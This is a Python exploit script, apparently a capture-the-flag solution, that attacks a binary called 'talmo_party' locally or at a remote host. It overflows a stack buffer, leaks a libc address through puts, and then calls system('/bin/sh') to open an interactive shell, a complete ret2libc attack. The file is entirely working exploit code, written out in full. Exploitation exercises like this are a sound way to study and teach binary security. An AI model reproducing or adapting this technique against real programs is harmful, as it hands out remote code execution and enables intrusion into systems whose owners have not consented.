#!/usr/bin/python
# coding: utf-8

from pwn import *
import sys

stdin = 0x0804A060
pr = 0x08048425
pppr = 0x08048849
bss = 0x0804a040 + 0x40
binsh = "/bin/sh\x00"
offset = 0x24f00

def main():

    e = ELF("./talmo_party")

    if len(sys.argv) > 1:
        p = process(e.path)
        libc = e.libc

    else:
        p = remote("layer7.kr", 12003)
        libc = ELF("layer7.so.6")

    p.sendline('3')

    payload = "A" * 0x40
    payload += "B" * 4
    payload += p32(e.plt['puts'])
    payload += p32(pr)
    payload += p32(e.got['puts'])

    payload += p32(0x080486E0)

    p.sendline(payload)
    p.recvuntil("Good bye~~!\n")

    puts_got = u32(p.recv(4))
    libc_base = puts_got - libc.symbols['puts']
    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search('/bin/sh\x00'))

    p.recvuntil("tell me your impression plz!\n")

    payload = "A" * 0x40
    payload += "B" * 4
    payload += p32(system)
    payload += "AAAA"
    payload += p32(binsh)

    p.sendline(payload)

    log.success("puts@got : {0}".format(hex(puts_got)))
    log.success("leaked libc base : {0}".format(hex(libc_base)))
    log.success("system@got : {}".format(hex(system)))
    log.success("/bin/sh : {0}".format(hex(binsh)))

    p.interactive()

if __name__ == '__main__':
    main()

